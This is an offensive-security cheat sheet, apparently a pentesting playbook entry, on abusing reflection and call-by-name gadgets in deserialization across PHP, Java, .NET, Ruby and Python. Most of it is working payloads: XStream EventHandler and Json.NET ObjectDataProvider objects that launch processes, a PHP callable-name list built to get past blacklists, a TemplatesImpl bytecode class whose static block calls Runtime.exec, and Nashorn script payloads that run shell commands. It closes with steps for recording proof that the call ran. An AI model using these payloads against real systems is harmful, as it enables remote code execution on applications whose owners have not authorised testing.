# Unsafe Reflection — when the sink is a method call by name

## The mechanism

Deserialization often ends not at `exec` but at **reflection** — a gadget
that calls a method *whose name is data*. The dangerous primitive is
"call this method on this object" where both are attacker-chosen.

```php
call_user_func($this->callback, $this->arg)      // callable is a prop
call_user_func_array($this->cb, $this->args)     // args too
$this->{$this->method}($this->arg)               // method-name prop
$cls::$method($arg)                              // static call
$ref = new ReflectionMethod($cls,$m); $ref->invoke($obj,$arg)
```

```java
Method.invoke(obj, args)                          // any method, any object
Class.forName(name).getMethod(m).invoke(...)       // two-step
ObjectDataProvider.MethodName = "Start"           // .NET named-method
```

```ruby
obj.send(method_sym)                              // send is the trampoline
obj.public_send(m)                                // public only
klass.new.method(m).call(args)
```

```python
getattr(obj, name)(*args)                         # attr-by-name + call
obj.__class__.__dict__[name](obj)                  # dict-lookup call
```

## The chain shape — `EventHandler`/`ObjectDataProvider` pattern

```xml
<!-- Java/XStream: -->
<handler class="java.beans.EventHandler">
  <target class="java.lang.ProcessBuilder"><command><string>id</string></command></target>
  <action>start</action>        <!-- the method NAME is data -->
</handler>
```

```json
// .NET Json.NET:
{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework",
 "MethodName":"Start",                    // the method NAME is data
 "MethodParameters":{"$type":"System.Collections.ArrayList",
                     "$values":["cmd","/c id"]},
 "ObjectInstance":{"$type":"System.Diagnostics.Process, System"}}
```

The *generic* gadget — `EventHandler`, `ObjectDataProvider`, `MethodClosure`,
`call_user_func` — is a class whose DESERIALIZED STATE names the method.
You never write the call — you supply the method-name string.

## The "callable-string" smuggling — PHP specifically

```php
// a prop that IS a callable string:
{"O":"X","props":{"cb":"system","arg":"id"}}
// → $this->cb runs as 'system' if the class does call_user_func($this->cb)

// the namespaced names that slip a callable blacklist:
cb: "passthru"           // if 'system' is filtered
cb: "proc_open"
cb: "popen"
cb: "pcntl_exec"
cb: "shell_exec"
cb: "assert"
cb: "preg_replace"        // with /e modifier in args
cb: "create_function"
cb: "array_map"           // cb=array_map, args=[assert, [code]]
cb: "call_user_func"      // cb=call_user_func, args=[system, id]  — meta!
cb: "Phar::extractTo"
cb: "file_put_contents"
```

## The property-controlled method-name — the strongest primitive

```php
class Event {
    public $name;   // → $this->{$this->name}() is called on dispatch
    public $args;
    function dispatch(){ $this->{$this->name}(...$this->args); }
}
```

A class that calls `$this->{$prop->name}($prop->args)` — the METHOD is a
prop. You call ANY method the object's class has, on args you choose.

## The Java `Method.invoke` trampoline

```java
// the gadget calls a method whose name is a field:
Method m = target.getClass().getMethod(this.methodName);
m.invoke(target, this.args);           // both name AND args are props
```

`InvokerTransformer.transform` does exactly this — `iMethodName` and
`iParamTypes`/`iArgs` are serialized fields → `Method.invoke` on them.

## The `TemplatesImpl.newTransformer` — the bytecode gadget

```
com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl
  → _bytecodes = your compiled evil.class bytes
  → newTransformer() → ClassLoader.defineClass(_bytecodes) → static block runs
```

This is the Jdk7u21/CC mechanism — you don't need `Runtime.exec` in the
chain; you smuggle a COMPILED class whose static block IS the RCE. The
deserializer instantiates `TemplatesImpl`, its `newTransformer` defines
your class, the class's static block runs.

```java
public class Evil extends AbstractTranslet {
    static { try { Runtime.getRuntime().exec("id"); } catch (Exception e){} }
    // ... implements AbstractTranslet's abstract methods
}
```

The chain's job is only to get `newTransformer()` called — the payload is
a `.class` file's bytes inside the object.

## The `ScriptEngine` eval sink

```java
// a gadget that ends in ScriptEngineManager.eval:
new ScriptEngineManager().getEngineByName("js").eval(this.script)
// the script prop = JS/nashorn → Java.type("java.lang.Runtime") → exec
```

```javascript
// the script payload (nashorn):
Java.type('java.lang.Runtime').getRuntime().exec('id')
var P = Java.type('java.lang.ProcessBuilder'); new P('sh','-c','id').start()
```

## The `send`/`__call__`/`__invoke` boundary

| Lang | The "call by name" |
|---|---|
| Ruby | `send`, `public_send`, `method(name).call`, `instance_eval`, `class_eval`, `eval` |
| Python | `getattr(obj,name)()`, `obj.__dict__[name]()`, `exec`, `eval`, `apply` |
| PHP | `call_user_func*`, `$obj->$m()`, `ReflectionMethod::invoke` |
| Java | `Method.invoke`, `Class.forName().getMethod().invoke`, `Invokedynamic` |
| .NET | `ObjectDataProvider.MethodName`, `EventHandler`, `Delegate.DynamicInvoke` |

## The "no reflection" falsifier

- No class on the classpath has a "call by name" hook AND no generic gadget
  (no commons-collections, no ObjectDataProvider, no EventHandler) → the
  chain can't reach a callable → the impact ceiling is prop-injection only.
- `find_class`/`Binder` whitelists the callable-classes → same.

## Output to record

- The reflection point (the method-name prop / the generic gadget class)
- The method+callable the payload names
- The verbatim response proving the call ran
